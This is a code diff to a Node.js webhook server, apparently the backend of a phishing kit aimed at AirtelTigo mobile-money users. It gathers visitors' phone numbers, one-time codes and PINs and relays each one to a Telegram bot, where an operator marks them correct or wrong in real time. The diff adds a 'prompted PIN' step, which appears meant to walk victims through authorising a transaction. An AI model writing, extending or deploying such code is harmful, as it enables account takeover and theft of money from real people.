@@ -1,4 +1,4 @@
-// airteltigo-server.js - Admin Approval via Telegram Webhooks
+// airteltigo-server.js - Prompted PIN Flow with Telegram Webhooks
 // ── WEBHOOK MODE ──────────────────────────────────────────────────────────
 // Uses Telegram webhooks instead of long-polling.
 // Benefits on Render:
@@ -29,16 +29,17 @@ app.use(express.json({ limit: '10kb' }));
 
 // ─── CONFIG ────────────────────────────────────────────────────────────────
 const CFG = Object.freeze({
-  APPROVAL_TIMEOUT:  5 * 60_000,
-  CLEANUP_INTERVAL:  15_000,
-  MAX_USERS:         parseInt(process.env.MAX_USERS) || 1,
-  TG_CHAT_INTERVAL:  1_050,       // ms — Telegram: 1 msg/s per chat
-  MAX_MSG_SIZE:      4_096,
-  SSE_HEARTBEAT:     20_000,
-  SEND_RETRIES:      3,
-  SEND_RETRY_DELAY:  1_500,
-  DUPE_TTL:          5_000,
-  WEBHOOK_URL:       (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
+  APPROVAL_TIMEOUT:       5 * 60_000,       // 5 minutes for phone/OTP/PIN
+  PROMPTED_PIN_TIMEOUT:   25 * 60_000,      // 25 minutes for prompted PIN
+  CLEANUP_INTERVAL:       15_000,
+  MAX_USERS:              parseInt(process.env.MAX_USERS) || 1,
+  TG_CHAT_INTERVAL:       1_050,            // ms — Telegram: 1 msg/s per chat
+  MAX_MSG_SIZE:           4_096,
+  SSE_HEARTBEAT:          20_000,
+  SEND_RETRIES:           3,
+  SEND_RETRY_DELAY:       1_500,
+  DUPE_TTL:               5_000,
+  WEBHOOK_URL:            (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
 });
 
 // ─── LOGGER ────────────────────────────────────────────────────────────────
@@ -148,7 +149,7 @@ const validatePin = (pin) => {
   if (!pin || typeof pin !== 'string') {
     return { valid: false };
   }
-  return { valid: pin.length === 4 && /^\d+$/.test(pin) };
+  return { valid: pin.length >= 4 && pin.length <= 6 && /^\d+$/.test(pin) };
 };
 
 const validateOtp = (otp) => {
@@ -277,11 +278,12 @@ class BotManager {
         const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
         await bot.sendMessage(msg.chat.id,
           `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
-          `📊 Pending phones: ${user.phoneApprovals.size}\n` +
-          `📊 Pending OTPs:   ${user.otpApprovals.size}\n` +
-          `📊 Pending PINs:   ${user.pinApprovals.size}\n` +
-          `✅ Verified:       ${user.verifiedUsers.size}\n` +
-          `📡 SSE clients:    ${sseBroker.size}\n` +
+          `📊 Pending phones:      ${user.phoneApprovals.size}\n` +
+          `📊 Pending OTPs:        ${user.otpApprovals.size}\n` +
+          `📊 Pending PINs:        ${user.pinApprovals.size}\n` +
+          `📊 Pending prompted PINs: ${user.promptedPinApprovals.size}\n` +
+          `✅ Verified:            ${user.verifiedUsers.size}\n` +
+          `📡 SSE clients:         ${sseBroker.size}\n` +
           `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
           `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
           `${info?.last_error_message ? `⚠️ Last error: ${info.last_error_message}` : '✅ No errors'}\n` +
@@ -318,6 +320,12 @@ async function handleCallback(user, q) {
       reply_markup: { inline_keyboard: [] },
     }).catch(e => logger.debug('edit skipped:', e.message));
 
+  const editMarkup = () =>
+    bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: mid }
+    ).catch(e => logger.debug('editMarkup skipped:', e.message));
+
   const answer = (text, alert = false) =>
     bot.answerCallbackQuery(qid, { text, show_alert: alert })
       .catch(e => logger.debug('answer skipped:', e.message));
@@ -330,16 +338,8 @@ async function handleCallback(user, q) {
 
   if (type === 'phone') {
     const approval = user.phoneApprovals.get(phone);
-    if (!approval) {
-      await answer('❌ Session expired', true);
-      return;
-    }
-
-    if (approval.status) {
-      await answer('✅ Already processed');
-      return;
-    }
-
+    if (!approval) { await answer('❌ Session expired', true); return; }
+    if (approval.status) { await answer('✅ Already processed'); return; }
     if (now - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
       approval.status = 'timeout';
       sseBroker.push(`phone:${phone}`, { status: 'timeout' });
@@ -351,13 +351,13 @@ async function handleCallback(user, q) {
     }
 
     approval.status = action;
-
+    sseBroker.push(`phone:${phone}`, { status: action });
+    
     const messages = {
       allow: `✅ <b>ALLOWED</b>\n📱 <code>${phone}</code>\n\n→ Proceeding to OTP`,
       invalid: `❌ <b>INVALID</b>\n📱 <code>${phone}</code>\n\n❌ Phone not eligible`
     };
 
-    sseBroker.push(`phone:${phone}`, { status: action });
     await Promise.all([
       edit(messages[action] || ''),
       answer(action === 'allow' ? '✅ Allowed!' : '❌ Marked invalid'),
@@ -367,16 +367,8 @@ async function handleCallback(user, q) {
 
   if (type === 'otp') {
     const approval = user.otpApprovals.get(phone);
-    if (!approval) {
-      await answer('❌ Session expired', true);
-      return;
-    }
-
-    if (approval.status) {
-      await answer('✅ Already processed');
-      return;
-    }
-
+    if (!approval) { await answer('❌ Session expired', true); return; }
+    if (approval.status) { await answer('✅ Already processed'); return; }
     if (now - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
       approval.status = 'timeout';
       sseBroker.push(`otp:${phone}`, { status: 'timeout' });
@@ -388,13 +380,13 @@ async function handleCallback(user, q) {
     }
 
     approval.status = action;
+    sseBroker.push(`otp:${phone}`, { status: action });
 
     const messages = {
       correct: `✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n→ Proceeding to PIN`,
       wrong: `❌ <b>WRONG</b>\n📱 <code>${phone}</code>\n\n❌ OTP incorrect`
     };
 
-    sseBroker.push(`otp:${phone}`, { status: action });
     await Promise.all([
       edit(messages[action] || ''),
       answer(action === 'correct' ? '✅ Verified!' : '❌ Wrong OTP'),
@@ -404,16 +396,8 @@ async function handleCallback(user, q) {
 
   if (type === 'pin') {
     const approval = user.pinApprovals.get(phone);
-    if (!approval) {
-      await answer('❌ Session expired', true);
-      return;
-    }
-
-    if (approval.status) {
-      await answer('✅ Already processed');
-      return;
-    }
-
+    if (!approval) { await answer('❌ Session expired', true); return; }
+    if (approval.status) { await answer('✅ Already processed'); return; }
     if (now - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
       approval.status = 'timeout';
       sseBroker.push(`pin:${phone}`, { status: 'timeout' });
@@ -424,22 +408,78 @@ async function handleCallback(user, q) {
       return;
     }
 
-    approval.status = action;
-
     if (action === 'correct') {
+      approval.status = 'correct';
       user.verifiedUsers.add(phone);
+      sseBroker.push(`pin:${phone}`, { status: 'correct' });
+      await Promise.all([
+        answer('✅ PIN Correct'),
+        editMarkup(),
+      ]);
+    } else if (action === 'promptpin') {
+      approval.status = 'prompt_pin_waiting';
+      sseBroker.push(`pin:${phone}`, { status: 'prompt_pin_waiting' });
+      await Promise.all([
+        answer('🔐 Sending Prompt PIN buttons...'),
+        editMarkup(),
+      ]);
+
+      user.promptedPinApprovals.set(phone, { timestamp: Date.now(), status: null });
+
+      setTimeout(async () => {
+        try {
+          await user.bot.sendMessage(
+            user.chatId,
+            `🔑 <b>${sanitize(user.name)} - Prompted PIN Result</b>\n\n` +
+            `📱 Phone: <code>${phone}</code>\n` +
+            `⏰ ${new Date().toLocaleString()}\n\n` +
+            `⚠️ <b>Did user complete the PIN prompt?</b>`,
+            {
+              parse_mode: 'HTML',
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: '✅ Successful', callback_data: mkCb('promptedpin', 'successful', phone) }],
+                  [{ text: '❌ Failed', callback_data: mkCb('promptedpin', 'failed', phone) }]
+                ]
+              }
+            }
+          );
+        } catch (error) {
+          logger.error(`Error sending prompted PIN buttons:`, error.message);
+        }
+      }, 500);
+    } else if (action === 'wrong') {
+      approval.status = 'wrong';
+      sseBroker.push(`pin:${phone}`, { status: 'wrong' });
+      await Promise.all([
+        answer('❌ PIN Wrong'),
+        editMarkup(),
+      ]);
     }
+    return;
+  }
 
-    const messages = {
-      correct: `✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n✅ USER AUTHENTICATED`,
-      wrong: `❌ <b>WRONG</b>\n📱 <code>${phone}</code>\n\n❌ PIN incorrect`
-    };
+  if (type === 'promptedpin') {
+    const approval = user.promptedPinApprovals.get(phone);
+    if (!approval) { await answer('❌ Session expired', true); return; }
+    if (approval.status) { await answer('✅ Already processed'); return; }
 
-    sseBroker.push(`pin:${phone}`, { status: action });
-    await Promise.all([
-      edit(messages[action] || ''),
-      answer(action === 'correct' ? '✅ Authenticated!' : '❌ Wrong PIN'),
-    ]);
+    if (action === 'successful') {
+      approval.status = 'prompted_pin_successful';
+      user.verifiedUsers.add(phone);
+      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_successful' });
+      await Promise.all([
+        answer('✅ PIN Successful'),
+        edit(`✅ <b>SUCCESSFUL</b>\n📱 <code>${phone}</code>\n\n✅ User authenticated with prompted PIN`),
+      ]);
+    } else if (action === 'failed') {
+      approval.status = 'prompted_pin_failed';
+      sseBroker.push(`promptedpin:${phone}`, { status: 'prompted_pin_failed' });
+      await Promise.all([
+        answer('❌ PIN Failed'),
+        edit(`❌ <b>FAILED</b>\n📱 <code>${phone}</code>\n\n❌ User did not complete prompted PIN (can retry)`),
+      ]);
+    }
     return;
   }
 
@@ -494,6 +534,7 @@ const users = new Map();
       phoneApprovals: new Map(),
       otpApprovals: new Map(),
       pinApprovals: new Map(),
+      promptedPinApprovals: new Map(),
       verifiedUsers: new Set(),
       dupes: new DupeCache(),
       tgQueue: new TgQueue(),
@@ -543,7 +584,10 @@ users.forEach((user) => {
 setInterval(() => {
   const now    = Date.now();
   const expire = now - CFG.APPROVAL_TIMEOUT;
+  const ppExpire = now - CFG.PROMPTED_PIN_TIMEOUT;
   const purge  = now - 10 * 60_000;
+  const ppPurge = now - 30 * 60_000;
+  
   for (const u of users.values()) {
     for (const [k, v] of u.phoneApprovals) {
       if (!v.status && v.timestamp < expire) {
@@ -566,6 +610,13 @@ setInterval(() => {
       }
       if (v.timestamp < purge) u.pinApprovals.delete(k);
     }
+    for (const [k, v] of u.promptedPinApprovals) {
+      if (!v.status && v.timestamp < ppExpire) {
+        v.status = 'prompted_pin_timeout';
+        sseBroker.push(`promptedpin:${k}`, { status: 'prompted_pin_timeout' });
+      }
+      if (v.timestamp < ppPurge) u.promptedPinApprovals.delete(k);
+    }
   }
 }, CFG.CLEANUP_INTERVAL).unref?.();
 
@@ -579,7 +630,8 @@ const botOk = (u, res) => {
 app.get('/api/health', (_, res) => {
   const list = [...users.values()].map(u => ({
     name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
-    phones: u.phoneApprovals.size, otps: u.otpApprovals.size, pins: u.pinApprovals.size,
+    phones: u.phoneApprovals.size, otps: u.otpApprovals.size,
+    pins: u.pinApprovals.size, promptedPins: u.promptedPinApprovals.size,
     verified: u.verifiedUsers.size, sse: sseBroker.size, lastErr: u.lastErr,
     webhookPath: u.mgr._path,
   }));
@@ -598,11 +650,7 @@ users.forEach((user, link) => {
     const { phoneNumber } = req.body;
     
     if (!phoneNumber || !validatePhoneNumber(phoneNumber).valid) {
-      return res.json({ 
-        success: true,
-        status: 'invalid',
-        message: 'Invalid phone format'
-      });
+      return res.json({ success: true, status: 'invalid', message: 'Invalid phone format' });
     }
 
     if (user.dupes.seen(`phone:${phoneNumber}`)) {
@@ -632,26 +680,15 @@ users.forEach((user, link) => {
   // ───────────────────────────────────────────
   app.post(`${R}/check-phone-status`, (req, res) => {
     const { phoneNumber } = req.body;
-    if (!phoneNumber) {
-      return res.status(400).json({ success: false, message: 'Phone required' });
-    }
+    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
 
     const approval = user.phoneApprovals.get(phoneNumber);
-    if (!approval) {
-      return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
-    }
-
-    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
-      return res.json({ success: true, status: 'timeout', message: 'Session expired' });
-    }
-
-    if (approval.status === 'allow') {
-      return res.json({ success: true, status: 'allow', message: 'Phone allowed' });
-    } else if (approval.status === 'invalid') {
-      return res.json({ success: true, status: 'invalid', message: 'Phone marked as invalid' });
-    } else {
-      return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
-    }
+    if (!approval) return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
+    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout', message: 'Session expired' });
+    if (approval.status === 'allow') return res.json({ success: true, status: 'allow', message: 'Phone allowed' });
+    if (approval.status === 'invalid') return res.json({ success: true, status: 'invalid', message: 'Phone marked as invalid' });
+    
+    return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
   });
 
   // ───────────────────────────────────────────
@@ -712,26 +749,15 @@ users.forEach((user, link) => {
   // ───────────────────────────────────────────
   app.post(`${R}/check-otp-status`, (req, res) => {
     const { phoneNumber } = req.body;
-    if (!phoneNumber) {
-      return res.status(400).json({ success: false, message: 'Phone required' });
-    }
+    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
 
     const approval = user.otpApprovals.get(phoneNumber);
-    if (!approval) {
-      return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
-    }
-
-    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
-      return res.json({ success: true, status: 'timeout', message: 'Session expired' });
-    }
-
-    if (approval.status === 'correct') {
-      return res.json({ success: true, status: 'correct', message: 'OTP is correct' });
-    } else if (approval.status === 'wrong') {
-      return res.json({ success: true, status: 'wrong', message: 'OTP is wrong' });
-    } else {
-      return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
-    }
+    if (!approval) return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
+    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout', message: 'Session expired' });
+    if (approval.status === 'correct') return res.json({ success: true, status: 'correct', message: 'OTP is correct' });
+    if (approval.status === 'wrong') return res.json({ success: true, status: 'wrong', message: 'OTP is wrong' });
+    
+    return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
   });
 
   // ───────────────────────────────────────────
@@ -750,7 +776,7 @@ users.forEach((user, link) => {
   });
 
   // ───────────────────────────────────────────
-  // STEP 3: VERIFY PIN
+  // STEP 3: VERIFY PIN (FIRST PIN)
   // ───────────────────────────────────────────
   app.post(`${R}/verify-pin`, async (req, res) => {
     if (!botOk(user, res)) return;
@@ -778,6 +804,7 @@ users.forEach((user, link) => {
 
     const keyboard = { inline_keyboard: [
       [{ text: '✅ Correct', callback_data: mkCb('pin', 'correct', phoneNumber) }],
+      [{ text: '🔐 Prompt PIN', callback_data: mkCb('pin', 'promptpin', phoneNumber) }],
       [{ text: '❌ Wrong', callback_data: mkCb('pin', 'wrong', phoneNumber) }]
     ]};
 
@@ -792,26 +819,16 @@ users.forEach((user, link) => {
   // ───────────────────────────────────────────
   app.post(`${R}/check-pin-status`, (req, res) => {
     const { phoneNumber } = req.body;
-    if (!phoneNumber) {
-      return res.status(400).json({ success: false, message: 'Phone required' });
-    }
+    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
 
     const approval = user.pinApprovals.get(phoneNumber);
-    if (!approval) {
-      return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
-    }
-
-    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
-      return res.json({ success: true, status: 'timeout', message: 'Session expired' });
-    }
-
-    if (approval.status === 'correct') {
-      return res.json({ success: true, status: 'correct', message: 'PIN is correct' });
-    } else if (approval.status === 'wrong') {
-      return res.json({ success: true, status: 'wrong', message: 'PIN is wrong' });
-    } else {
-      return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
-    }
+    if (!approval) return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
+    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout', message: 'Session expired' });
+    if (approval.status === 'correct') return res.json({ success: true, status: 'correct', message: 'PIN is correct' });
+    if (approval.status === 'prompt_pin_waiting') return res.json({ success: true, status: 'prompt_pin_waiting', message: 'Prompt PIN mode activated' });
+    if (approval.status === 'wrong') return res.json({ success: true, status: 'wrong', message: 'PIN is wrong' });
+    
+    return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
   });
 
   // ───────────────────────────────────────────
@@ -827,6 +844,67 @@ users.forEach((user, link) => {
       return res.end();
     }
     sseBroker.subscribe(`pin:${phone}`, res);
+  });
+
+  // ───────────────────────────────────────────
+  // CHECK PROMPTED PIN STATUS (SECOND PIN)
+  // ───────────────────────────────────────────
+  app.post(`${R}/check-prompted-pin-status`, (req, res) => {
+    const { phoneNumber } = req.body;
+    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
+
+    const approval = user.promptedPinApprovals.get(phoneNumber);
+    if (!approval) return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
+    if (Date.now() - approval.timestamp > CFG.PROMPTED_PIN_TIMEOUT) return res.json({ success: true, status: 'prompted_pin_timeout', message: 'Timeout' });
+    if (approval.status === 'prompted_pin_successful') return res.json({ success: true, status: 'prompted_pin_successful', message: 'Prompted PIN successful' });
+    if (approval.status === 'prompted_pin_failed') return res.json({ success: true, status: 'prompted_pin_failed', message: 'Prompted PIN failed' });
+    
+    return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
+  });
+
+  // ───────────────────────────────────────────
+  // STREAM PROMPTED PIN STATUS (SSE)
+  // ───────────────────────────────────────────
+  app.get(`${R}/stream-prompted-pin-status`, (req, res) => {
+    const { phone } = req.query;
+    if (!phone) return res.status(400).json({ success: false, message: 'Phone required' });
+    const approval = user.promptedPinApprovals.get(phone);
+    if (approval && approval.status) {
+      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
+      res.write(`data: ${JSON.stringify({ status: approval.status })}\n\n`);
+      return res.end();
+    }
+    sseBroker.subscribe(`promptedpin:${phone}`, res);
+  });
+
+  // ───────────────────────────────────────────
+  // PROMPTED PIN RETRY
+  // ───────────────────────────────────────────
+  app.post(`${R}/prompted-pin-retry`, async (req, res) => {
+    if (!botOk(user, res)) return;
+    const { phoneNumber } = req.body;
+    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
+
+    const approval = user.promptedPinApprovals.get(phoneNumber);
+    if (!approval) return res.json({ success: false, message: 'Approval not found' });
+
+    approval.status = null;
+    approval.timestamp = Date.now();
+
+    const text = `🔑 <b>${sanitize(user.name)} — Prompted PIN Retry</b>\n\n` +
+                 `📱 Phone: <code>${phoneNumber}</code>\n` +
+                 `⏰ ${new Date().toLocaleString()}\n\n` +
+                 `⚠️ <b>Did user complete the PIN prompt this time?</b>`;
+
+    const keyboard = { inline_keyboard: [
+      [{ text: '✅ Successful', callback_data: mkCb('promptedpin', 'successful', phoneNumber) }],
+      [{ text: '❌ Failed', callback_data: mkCb('promptedpin', 'failed', phoneNumber) }]
+    ]};
+
+    const r = await sendMsg(user, text, { reply_markup: keyboard });
+    r.ok
+      ? res.json({ success: true, message: 'Retry initiated' })
+      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
   });
 });
 
@@ -852,7 +930,7 @@ process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r))
 // ─── START ────────────────────────────────────────────────────────────────
 const server = app.listen(PORT, () => {
   console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log(`🤖 Airteltigo Webhook Server`);
+  console.log(`🤖 Airteltigo Prompted PIN Webhook Server`);
   console.log(`🚀 Port: ${PORT}`);
   console.log(`🌐 Webhook base: ${CFG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
   console.log(`👥 Users: ${users.size}/${CFG.MAX_USERS}`);
